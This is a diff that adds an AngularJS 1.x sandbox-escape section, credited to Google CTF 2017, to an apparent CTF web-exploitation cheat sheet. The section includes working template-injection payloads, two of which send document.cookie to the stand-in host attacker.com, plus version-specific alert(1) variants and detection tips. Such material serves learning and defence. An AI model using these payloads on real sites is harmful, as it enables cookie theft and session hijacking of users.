@@ -21,6 +21,7 @@
 - [CSS/JS Paywall Bypass](#cssjs-paywall-bypass)
 - [JPEG+HTML Polyglot XSS (EHAX 2026)](#jpeghtml-polyglot-xss-ehax-2026)
 - [JSFuck Decoding](#jsfuck-decoding)
+- [AngularJS 1.x Sandbox Escape via charAt/trim Override (Google CTF 2017)](#angularjs-1x-sandbox-escape-via-charattrim-override-google-ctf-2017)
 - [Admin Bot javascript: URL Scheme Bypass (DiceCTF 2026)](#admin-bot-javascript-url-scheme-bypass-dicectf-2026)
 - [XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)](#xs-leak-via-image-load-timing--graphql-csrf-htb-grandmonty)
   - [Why it works](#why-it-works)
@@ -327,6 +328,40 @@ const code = fs.readFileSync('jsfuck.js', 'utf8');
 const func = eval(code.slice(0, -2));
 console.log(func.toString());  // Reveals original code with hardcoded flag
 ```
+
+---
+
+## AngularJS 1.x Sandbox Escape via charAt/trim Override (Google CTF 2017)
+
+**Pattern:** AngularJS versions before 1.6 sandbox expressions to prevent arbitrary JavaScript execution in `{{ }}` bindings. The sandbox relies on `charAt` to validate identifiers character by character. Override `charAt` with `trim` on `String.prototype` to bypass the check, then use `$eval` to execute arbitrary JS.
+
+**Payload:**
+```javascript
+{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,window.location="http://attacker.com/"+document.cookie,a')}}
+```
+
+**How it works:**
+1. `toString().constructor.prototype` accesses `String.prototype`
+2. `a.charAt=a.trim` replaces `charAt` with `trim` on all strings
+3. The sandbox calls `charAt(0)` on identifiers to validate them -- but `trim` returns the full string instead of a single character
+4. This breaks the character-by-character validation, allowing any expression
+5. `$eval('expression')` evaluates arbitrary JavaScript in the Angular scope
+
+**Shorter variants for different AngularJS versions:**
+```javascript
+<!-- AngularJS 1.5.x -->
+{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)')}}
+
+<!-- AngularJS 1.4.x -->
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}
+
+<!-- AngularJS 1.3.x -->
+{{constructor.constructor('return window.location="http://attacker.com/"+document.cookie')()}}
+```
+
+**Detection:** Look for `ng-app` or `ng-controller` directives in HTML, AngularJS script includes (`angular.js` or `angular.min.js`), and `{{ }}` expression bindings that reflect user input.
+
+**Key insight:** The sandbox relies on `charAt` to validate identifiers. Replacing it with `trim` (which returns the full string) bypasses the character-by-character check, allowing arbitrary expression evaluation. AngularJS 1.6+ removed the sandbox entirely (acknowledging it was never a security boundary), but many CTFs and legacy apps still use older versions.
 
 ---
 
